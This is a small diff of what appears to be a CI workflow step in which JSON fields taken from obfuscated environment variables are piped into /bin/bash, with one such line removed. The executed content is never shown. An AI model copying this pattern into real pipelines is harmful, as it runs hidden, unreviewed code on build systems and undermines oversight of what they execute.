@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$d894" | jq -r .gst6 | /bin/bash
           echo $dpai0424 | jq -r .xpo83 | /bin/bash
-          echo $kb1 | jq -r .coj08536 | /bin/bash
           printf '%s' "$g4195" | jq -r .ymasl85857 | /bin/bash
 
       - name: Save data
